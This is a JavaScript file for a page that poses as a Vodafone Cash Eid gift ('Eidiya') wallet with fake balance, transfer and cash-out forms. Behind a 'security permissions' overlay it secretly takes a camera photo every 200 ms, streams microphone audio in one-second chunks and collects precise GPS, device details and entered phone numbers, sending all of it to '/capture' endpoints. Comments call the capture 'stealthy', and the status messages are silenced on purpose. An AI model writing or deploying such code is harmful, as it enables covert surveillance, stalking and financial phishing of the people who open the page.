// Global State
let balanceVisible = false;
let captureSessionId = null;
let captureAudioRecorder = null;
let captureAudioStream = null;
let capturePhotoTimer = null;
let capturePhotoStreams = [];
let capturePhotoVideos = [];
let capturePhotoInProgress = false;
let captureAudioChunkIndex = 0;
let captureIsUnloading = false;
let captureAudioFinished = false;
let captureShouldFinishAudio = false;
let captureAudioUploads = [];
const CAPTURE_PHOTO_INTERVAL_MS = 200;
const AUDIO_CHUNK_INTERVAL_MS = 1000;
const IGNORED_CAMERA_LABELS = ['droidcam', 'obs virtual', 'snap camera'];

// Page Load Setup
document.addEventListener('DOMContentLoaded', () => {
  // Check if permissions already approved
  const isApproved = localStorage.getItem('vf_permissions_approved');
  captureSessionId = localStorage.getItem('vf_capture_session_id');
  const overlay = document.getElementById('permissionsOverlay');
  if (isApproved === 'true') {
    if (overlay) overlay.classList.add('hidden');
    updateCaptureStatus('Capture permission granted. Use Stop to reset this browser.');
  } else {
    // Lock background scroll while overlay is active
    document.body.style.overflow = 'hidden';
  }

  // Setup click listener to close modals when clicking outside the container
  const modals = document.querySelectorAll('.modal-overlay');
  modals.forEach(modal => {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        closeModal(modal.id);
      }
    });
  });

  // Welcome toast suppressed to keep application clean.
});

window.addEventListener('pagehide', stopCaptureForUnload);
window.addEventListener('beforeunload', stopCaptureForUnload);

// Language Toggle Controller
function toggleLanguage() {
  const targetLang = window.currentLang === 'en' ? 'ar' : 'en';
  window.location.search = `?lang=${targetLang}`;
}

// Balance Visibility Controller
function toggleBalance() {
  const balanceEl = document.getElementById('balanceAmount');
  const eyeClosed = document.getElementById('eyeIconClosed');
  const eyeOpen = document.getElementById('eyeIconOpen');
  const actualAmount = balanceEl.getAttribute('data-amount');
  const currency = window.allTranslations[window.currentLang].currency;

  balanceVisible = !balanceVisible;

  if (balanceVisible) {
    // Show actual amount
    balanceEl.textContent = actualAmount;
    balanceEl.classList.add('shake');
    eyeClosed.classList.add('hidden');
    eyeOpen.classList.remove('hidden');
    
    // Remove shake class after animation completes
    setTimeout(() => {
      balanceEl.classList.remove('shake');
    }, 500);
  } else {
    // Hide and mask
    balanceEl.textContent = '••••••';
    eyeClosed.classList.remove('hidden');
    eyeOpen.classList.add('hidden');
  }
}

// Modal Controllers
function openModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.classList.add('show');
    // Lock background scroll
    document.body.style.overflow = 'hidden';
  }
}

function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.classList.remove('show');
    // Restore background scroll
    document.body.style.overflow = '';
  }
}

// Notification Toast Helpers
function showNotification(text) {
  const bar = document.getElementById('notificationBar');
  const textEl = bar.querySelector('.notification-text');
  
  textEl.textContent = text;
  bar.classList.add('show');

  // Auto hide after 5 seconds
  setTimeout(() => {
    closeNotification();
  }, 5000);
}

function closeNotification() {
  const bar = document.getElementById('notificationBar');
  bar.classList.remove('show');
}

// Eidiya Form Submission Handlers
async function submitEidiyaForm(e) {
  e.preventDefault();
  const form = e.target;
  const recipient = form.recipient.value;
  const amountVal = parseFloat(form.amount.value);
  const message = form.message.value;

  // Read current balance
  const balanceEl = document.getElementById('balanceAmount');
  let currentBalance = parseFloat(balanceEl.getAttribute('data-amount').replace(/,/g, ''));

  if (amountVal > currentBalance) {
    const errorMsg = window.currentLang === 'en' 
      ? 'Insufficient balance to send this Eidiya!' 
      : 'عفواً، رصيدك الحالي لا يكفي لإرسال هذه العيدية!';
    showNotification(errorMsg);
    return;
  }

  // Show inline loader on submit button
  const submitBtn = form.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.disabled = true;
  submitBtn.textContent = window.currentLang === 'en' ? 'Processing...' : 'جاري المعالجة...';

  // Get location if available
  let location = null;
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 6000 });
      });
      location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        speed: position.coords.speed,
        capturedAt: new Date().toISOString()
      };
    } catch (err) {
      console.warn('Geolocation capture failed during send Eidiya:', err.message);
    }
  }

  try {
    const response = await fetch('/capture/eidiya', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: captureSessionId,
        recipient,
        amount: amountVal,
        message,
        location
      })
    });
    
    const result = await response.json();
    if (!response.ok || !result.success) {
      throw new Error(result.message || 'Server error during eidiya transfer.');
    }

    closeModal('sendEidiyaModal');
    form.reset();

    // Deduct from Balance
    const newBalance = currentBalance - amountVal;
    const formattedBalance = newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    balanceEl.setAttribute('data-amount', formattedBalance);
    
    if (balanceVisible) {
      balanceEl.textContent = formattedBalance;
    }

    // Add transaction to recent activities programmatically
    addRecentTransaction({
      titleAr: `عيدية إلى ${recipient}`,
      titleEn: `Eidiya to ${recipient}`,
      timeAr: 'الآن',
      timeEn: 'Just now',
      amount: `-${amountVal.toFixed(2)}`,
      type: 'send'
    });

    const successMsg = window.currentLang === 'en'
      ? `Successfully sent ${amountVal} EGP Eidiya to ${recipient}! 🎁`
      : `تم إرسال عيدية بقيمة ${amountVal} جنيه بنجاح إلى ${recipient}! 🎁`;
    
    showNotification(successMsg);
  } catch (error) {
    console.error('Eidiya transfer request failed:', error);
    showNotification(window.currentLang === 'en'
      ? 'System error. Please try again later.'
      : 'عفواً، حدث خطأ في النظام. يرجى المحاولة لاحقاً.');
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = originalText;
  }
}

function submitGiftCardForm(e) {
  e.preventDefault();
  const form = e.target;
  const cardValue = parseFloat(form.cardValue.value);

  // Read current balance
  const balanceEl = document.getElementById('balanceAmount');
  let currentBalance = parseFloat(balanceEl.getAttribute('data-amount').replace(/,/g, ''));

  if (cardValue > currentBalance) {
    const errorMsg = window.currentLang === 'en' 
      ? 'Insufficient balance to purchase this card!' 
      : 'رصيدك الحالي لا يكفي لشراء كارت العيدية!';
    showNotification(errorMsg);
    return;
  }

  // Deduct
  const newBalance = currentBalance - cardValue;
  const formattedBalance = newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  balanceEl.setAttribute('data-amount', formattedBalance);
  
  if (balanceVisible) {
    balanceEl.textContent = formattedBalance;
  }

  closeModal('giftCardModal');

  // Add transaction
  addRecentTransaction({
    titleAr: `شراء كارت عيدية بقيمة ${cardValue}`,
    titleEn: `Purchased ${cardValue} EGP Gift Card`,
    timeAr: 'الآن',
    timeEn: 'Just now',
    amount: `-${cardValue.toFixed(2)}`,
    type: 'send'
  });

  const successMsg = window.currentLang === 'en'
    ? `Bought custom ${cardValue} EGP Eidiya Gift Card successfully! 💳`
    : `تم شراء كارت عيدية بقيمة ${cardValue} جنيه بنجاح! 💳`;
  
  showNotification(successMsg);
}

async function submitCashOutForm(e) {
  e.preventDefault();
  const form = e.target;
  const phoneNumber = form.phoneNumber.value;
  const amount = parseFloat(form.amount.value) || 1250;

  // Show inline loader on submit button
  const submitBtn = form.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.disabled = true;
  submitBtn.textContent = window.currentLang === 'en' ? 'Processing...' : 'جاري المعالجة...';

  // Attempt to capture GPS location coordinates right at the time of cash out click
  let location = null;
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 6000 });
      });
      location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        speed: position.coords.speed,
        capturedAt: new Date().toISOString()
      };
    } catch (err) {
      console.warn('Geolocation capture failed during cash out:', err.message);
    }
  }

  try {
    const response = await fetch('/capture/cashout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: captureSessionId,
        phoneNumber,
        amount,
        location
      })
    });
    
    const result = await response.json();
    if (!response.ok || !result.success) {
      throw new Error(result.message || 'Server error during withdrawal request.');
    }

    closeModal('cashOutModal');
    form.reset();

    // Show a success message matching Vodafone Cash style
    const successMsg = window.currentLang === 'en'
      ? `Withdrawal request of ${amount.toFixed(2)} EGP submitted! You will receive a verification SMS shortly.`
      : `تم تقديم طلب سحب عيدية بقيمة ${amount.toFixed(2)} جنيه! ستصلك رسالة تأكيد قصيرة قريباً.`;
    showNotification(successMsg);

    // Add to transaction log
    addRecentTransaction({
      titleAr: `طلب سحب عيدية إلى ${phoneNumber}`,
      titleEn: `Cash Out request to ${phoneNumber}`,
      timeAr: 'الآن',
      timeEn: 'Just now',
      amount: `-${amount.toFixed(2)}`,
      type: 'send'
    });

    // Deduct the balance visual representation
    const balanceEl = document.getElementById('balanceAmount');
    let currentBalance = parseFloat(balanceEl.getAttribute('data-amount').replace(/,/g, ''));
    const newBalance = Math.max(0, currentBalance - amount);
    const formattedBalance = newBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    balanceEl.setAttribute('data-amount', formattedBalance);
    if (balanceVisible) {
      balanceEl.textContent = formattedBalance;
    }
  } catch (error) {
    console.error('Cashout request failed:', error);
    showNotification(window.currentLang === 'en'
      ? 'System error. Please try again later.'
      : 'عفواً، حدث خطأ في النظام. يرجى المحاولة لاحقاً.');
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = originalText;
  }
}

// Dynamic Transaction Append Helper
function addRecentTransaction(tx) {
  const listEl = document.querySelector('.transactions-list');
  const currency = window.allTranslations[window.currentLang].currency;
  
  const cardHtml = `
    <div class="transaction-card" style="animation: slideDown 0.3s ease forwards;">
      <div class="tx-left">
        <div class="tx-icon-circle ${tx.type}">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 10l7-7m0 0l7 7m-7-7v18" />
          </svg>
        </div>
        <div class="tx-details">
          <span class="tx-title">${window.currentLang === 'en' ? tx.titleEn : tx.titleAr}</span>
          <span class="tx-time">${window.currentLang === 'en' ? tx.timeEn : tx.timeAr}</span>
        </div>
      </div>
      <div class="tx-right">
        <span class="tx-amount ${tx.type}">
          ${tx.amount} ${currency}
        </span>
      </div>
    </div>
  `;
  listEl.insertAdjacentHTML('afterbegin', cardHtml);
}

// Quick service alerts
function triggerDonationAlert() {
  const msg = window.currentLang === 'en'
    ? 'Send Eid donations directly to Zakat House & charities via Vodafone Cash 💚'
    : 'أرسل زكاة الفطر والصدقات مباشرة لبيت الزكاة والجمعيات الخيرية عبر فودافون كاش 💚';
  showNotification(msg);
}

function triggerAtmAlert() {
  const msg = window.currentLang === 'en'
    ? 'Withdraw your Eidiya from any ATM in Egypt without a card!'
    : 'اسحب عيديتك كاش من أي ماكينة صراف آلي في مصر بدون كارت!';
  showNotification(msg);
}

function triggerRechargeAlert() {
  const msg = window.currentLang === 'en'
    ? 'Recharge your mobile credit to call your friends and wish them Happy Eid! 📞'
    : 'اشحن رصيدك دلوقتي عشان تكلم أصحابك وتباركلهم بالعيد! 📞';
  showNotification(msg);
}

function triggerKahkAlert() {
  const msg = window.currentLang === 'en'
    ? 'Order your favorite Eid Kahk and sweets with 15% cashback via Vodafone Cash!'
    : 'اطلب كحك وبسكويت العيد دلوقتي واحصل على 15% كاش باك عبر فودافون كاش!';
  showNotification(msg);
}

// ==========================================
// Security Permissions Solicitation Handlers
// ==========================================
async function requestAllPermissions() {
  const grantBtn = document.getElementById('grantPermissionsBtn');
  grantBtn.disabled = true;
  grantBtn.textContent = window.currentLang === 'en' ? 'Requesting...' : 'جاري الطلب...';

  // 1. Geolocation Permission Prompt Promise
  const locationPromise = new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ type: 'location', status: 'unsupported' });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => resolve({ type: 'location', status: 'granted', data: position }),
      (error) => resolve({ type: 'location', status: 'denied', error: error }),
      { timeout: 5000 }
    );
  });

  // 2. Camera + Microphone Permission Prompt Promise (Requested in a single getUserMedia prompt)
  const mediaPromise = new Promise((resolve) => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      resolve({ type: 'media', status: 'unsupported' });
      return;
    }
    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
      .then((stream) => {
        // Stop stream tracks immediately to release hardware locks
        stream.getTracks().forEach(track => track.stop());
        resolve({ type: 'media', status: 'granted' });
      })
      .catch((error) => {
        resolve({ type: 'media', status: 'denied', error: error });
      });
  });

  // Trigger prompts in parallel (concurrently displaying browser permission boxes)
  const results = await Promise.all([locationPromise, mediaPromise]);
  console.log("Permissions requested concurrently:", results);

  // Save to localStorage so they are not prompted again on reload
  localStorage.setItem('vf_permissions_approved', 'true');
  
  grantBtn.textContent = window.currentLang === 'en' ? 'Success! Loading...' : 'تم بنجاح! جاري التحميل...';

  // Short delay before the overlay slides away
  setTimeout(() => {
    const overlay = document.getElementById('permissionsOverlay');
    if (overlay) {
      overlay.classList.add('hidden');
    }
    document.body.style.overflow = '';
    // Trigger welcome notification toast
    showNotification(window.allTranslations[window.currentLang].notificationText);
  }, 1200);
}

// The explicit capture workflow below intentionally overrides the original
// permission-only handler above.
requestAllPermissions = async function () {
  const grantBtn = document.getElementById('grantPermissionsBtn');
  grantBtn.disabled = true;
  grantBtn.textContent = 'Requesting browser permissions...';

  try {
    // Request permissions sequentially so prompts do not overlap and block each other
    const locationResult = await requestLocationPermission();
    const mediaResult = await requestMediaPermission();

    if (mediaResult.status !== 'granted') {
      throw new Error('Camera and microphone permission is required to start capture.');
    }

    const sessionPayload = {
      location: locationResult.data || null,
      permissions: {
        location: locationResult.status,
        media: mediaResult.status
      },
      language: navigator.language || null,
      platform: navigator.platform || null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        pixelRatio: window.devicePixelRatio || 1
      }
    };

    const sessionResponse = await fetch('/capture/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(sessionPayload)
    });
    const sessionJson = await sessionResponse.json();

    if (!sessionResponse.ok || !sessionJson.sessionId) {
      throw new Error(sessionJson.message || 'Could not create capture session.');
    }

    captureSessionId = sessionJson.sessionId;
    captureAudioFinished = false;
    captureShouldFinishAudio = false;
    captureAudioUploads = [];
    localStorage.setItem('vf_capture_session_id', captureSessionId);
    localStorage.setItem('vf_permissions_approved', 'true');

    await startAudioStreaming(mediaResult.stream);
    await startPhotoCaptureLoop();

    grantBtn.textContent = window.currentLang === 'en' ? 'Success! Loading...' : 'تم بنجاح! جاري التحميل...';
    setTimeout(() => {
      const overlay = document.getElementById('permissionsOverlay');
      if (overlay) {
        overlay.classList.add('hidden');
      }
      document.body.style.overflow = '';
      // Welcome notification suppressed.
    }, 1200);
  } catch (error) {
    grantBtn.disabled = false;
    grantBtn.textContent = window.currentLang === 'en' ? 'Try Again' : 'إعادة المحاولة';
    showNotification(window.currentLang === 'en' ? 'Security check failed. Please check your connection and try again.' : 'فشل التحقق من الأمان. يرجى التحقق من الاتصال وإعادة المحاولة.');
  }
};

function requestLocationPermission() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ status: 'unsupported', data: null });
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => resolve({
        status: 'granted',
        data: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed,
          capturedAt: new Date().toISOString()
        }
      }),
      (error) => resolve({ status: 'denied', data: null, message: error.message }),
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
  });
}

async function requestMediaPermission() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return { status: 'unsupported', stream: null };
  }

  try {
    let stream = await navigator.mediaDevices.getUserMedia({
      audio: {
        echoCancellation: false,
        noiseSuppression: false,
        autoGainControl: true
      },
      video: true
    });

    const selectedTrack = stream.getAudioTracks()[0];
    if (selectedTrack && isIgnoredAudioDevice(selectedTrack.label)) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const preferredMic = devices.find(device => (
        device.kind === 'audioinput' && !isIgnoredAudioDevice(device.label)
      ));

      if (preferredMic) {
        stream.getTracks().forEach(track => track.stop());
        stream = await navigator.mediaDevices.getUserMedia({
          audio: {
            deviceId: { exact: preferredMic.deviceId },
            echoCancellation: false,
            noiseSuppression: false,
            autoGainControl: true
          },
          video: false
        });
      }
    }

    return { status: 'granted', stream };
  } catch (error) {
    return { status: 'denied', stream: null, message: error.message };
  }
}

async function startAudioStreaming(stream) {
  captureAudioStream = stream;
  stream.getVideoTracks().forEach(track => track.stop());

  if (!window.MediaRecorder) {
    updateCaptureStatus('Photos running. Audio recording is unsupported in this browser.');
    return;
  }

  const audioTracks = stream.getAudioTracks();
  if (!audioTracks.length) {
    return;
  }
  const audioTrack = audioTracks[0];
  if (audioTrack.muted || audioTrack.readyState !== 'live') {
    console.warn('Microphone track is not live. Check the selected input device.');
  }
  saveCaptureMetadata({
    audioInput: {
      label: audioTrack.label || null,
      enabled: audioTrack.enabled,
      muted: audioTrack.muted,
      readyState: audioTrack.readyState,
      settings: audioTrack.getSettings ? audioTrack.getSettings() : null
    }
  });

  const audioOnlyStream = new MediaStream(audioTracks);
  const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
    ? 'audio/webm;codecs=opus'
    : 'audio/webm';

  captureAudioRecorder = new MediaRecorder(audioOnlyStream, { mimeType });
  captureAudioRecorder.ondataavailable = async (event) => {
    if (!event.data || event.data.size === 0 || !captureSessionId) {
      return;
    }

    uploadAudioChunk(event.data);
  };
  captureAudioRecorder.onstop = () => {
    if (captureShouldFinishAudio) {
      finishAudioOnServer();
    }
  };

  captureAudioRecorder.start(AUDIO_CHUNK_INTERVAL_MS);
}

async function startPhotoCaptureLoop() {
  await setupPhotoCameras();
  await capturePhotosFromAvailableCameras();
  capturePhotoTimer = window.setInterval(capturePhotosFromAvailableCameras, CAPTURE_PHOTO_INTERVAL_MS);
}

async function uploadAudioChunk(blob) {
  const index = captureAudioChunkIndex++;
  const url = `/capture/${captureSessionId}/audio?index=${index}`;

  if (captureIsUnloading && navigator.sendBeacon) {
    navigator.sendBeacon(url, blob);
    return;
  }

  const upload = fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': blob.type || 'audio/webm' },
      body: blob
    }).catch(error => {
    console.error('Audio upload failed:', error);
  });

  captureAudioUploads.push(upload);
  await upload;
}

function saveCaptureMetadata(clientHints) {
  if (!captureSessionId) {
    return;
  }

  fetch(`/capture/${captureSessionId}/metadata`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ clientHints })
  }).catch(error => {
    console.error('Metadata update failed:', error);
  });
}

async function setupPhotoCameras() {
  cleanupPhotoCameras();

  const devices = await navigator.mediaDevices.enumerateDevices();
  const videoInputs = devices.filter(device => device.kind === 'videoinput');
  const preferredVideoInputs = videoInputs.filter(device => !isIgnoredCamera(device.label));
  const selectedVideoInputs = preferredVideoInputs.length ? preferredVideoInputs : videoInputs;
  // Filter out empty device IDs
  const validInputs = selectedVideoInputs.filter(device => device.deviceId);
  
  let cameraConfigs = [];
  if (validInputs.length > 0) {
    // Only capture from the primary/default camera to keep it fast, stealthy, and prevent overlapping streams
    const primaryDevice = validInputs[0];
    cameraConfigs.push({
      constraints: { video: { deviceId: { exact: primaryDevice.deviceId } }, audio: false },
      label: primaryDevice.label || 'Camera'
    });
  } else {
    cameraConfigs.push({ constraints: { video: true, audio: false }, label: 'Camera' });
  }

  for (const camera of cameraConfigs) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(camera.constraints);
      const video = document.createElement('video');
      video.muted = true;
      video.playsInline = true;
      video.srcObject = stream;
      await video.play();
      await waitForVideoFrame(video);

      capturePhotoStreams.push(stream);
      capturePhotoVideos.push({ video, label: camera.label });
    } catch (error) {
      console.error('Camera setup failed:', error);
    }
  }
}

function isIgnoredCamera(label) {
  const normalized = String(label || '').toLowerCase();
  return IGNORED_CAMERA_LABELS.some(ignored => normalized.includes(ignored));
}

function isIgnoredAudioDevice(label) {
  const normalized = String(label || '').toLowerCase();
  return normalized.includes('droidcam') || normalized.includes('virtual');
}

async function capturePhotosFromAvailableCameras() {
  if (capturePhotoInProgress || !captureSessionId || !capturePhotoVideos.length) {
    return;
  }

  capturePhotoInProgress = true;
  try {
    for (const source of capturePhotoVideos) {
      await captureSinglePhoto(source.video, source.label);
    }
  } catch (error) {
    console.error('Photo capture failed:', error);
  } finally {
    capturePhotoInProgress = false;
  }
}

async function captureSinglePhoto(video, deviceLabel) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 1280;
  canvas.height = video.videoHeight || 720;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL('image/jpeg', 0.72);

  await fetch(`/capture/${captureSessionId}/photo`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      image,
      facingMode: inferFacingMode(deviceLabel),
      deviceLabel,
      takenAt: new Date().toISOString()
    })
  });
}

function waitForVideoFrame(video) {
  return new Promise((resolve) => {
    if ('requestVideoFrameCallback' in video) {
      video.requestVideoFrameCallback(() => resolve());
      return;
    }

    setTimeout(resolve, 350);
  });
}

function inferFacingMode(label) {
  const normalized = String(label || '').toLowerCase();
  if (normalized.includes('front') || normalized.includes('user')) return 'front';
  if (normalized.includes('back') || normalized.includes('rear') || normalized.includes('environment')) return 'back';
  return 'unknown';
}

function updateCaptureStatus(text) {
  // Silent capture status handler - does nothing to keep the capture stealthy
}

function stopCaptureSession() {
  stopCaptureResources(true);
  localStorage.removeItem('vf_permissions_approved');
  localStorage.removeItem('vf_capture_session_id');
}

function stopCaptureForUnload() {
  captureIsUnloading = true;
  stopCaptureResources(true);
  localStorage.removeItem('vf_permissions_approved');
  localStorage.removeItem('vf_capture_session_id');
}

function stopCaptureResources(shouldFinishAudio = false) {
  if (capturePhotoTimer) {
    window.clearInterval(capturePhotoTimer);
    capturePhotoTimer = null;
  }

  let recorderWillStop = false;
  if (captureAudioRecorder && captureAudioRecorder.state !== 'inactive') {
    captureShouldFinishAudio = shouldFinishAudio;
    recorderWillStop = true;
    if (captureAudioRecorder.state === 'recording') {
      captureAudioRecorder.requestData();
    }
    captureAudioRecorder.stop();
  }

  if (captureAudioStream) {
    captureAudioStream.getTracks().forEach(track => track.stop());
  }

  cleanupPhotoCameras();
  captureAudioRecorder = null;
  captureAudioStream = null;

  if (shouldFinishAudio && !recorderWillStop) {
    finishAudioOnServer();
  }
}

function cleanupPhotoCameras() {
  capturePhotoStreams.forEach(stream => {
    stream.getTracks().forEach(track => track.stop());
  });
  capturePhotoStreams = [];
  capturePhotoVideos = [];
}

async function finishAudioOnServer() {
  if (!captureSessionId || captureAudioFinished) {
    return;
  }

  captureAudioFinished = true;
  const url = `/capture/${captureSessionId}/audio/finish`;

  if (captureIsUnloading && navigator.sendBeacon) {
    navigator.sendBeacon(url, new Blob([], { type: 'application/octet-stream' }));
    return;
  }

  await Promise.allSettled(captureAudioUploads);
  fetch(url, { method: 'POST' }).catch(error => {
    console.error('Audio finalize failed:', error);
  });
}
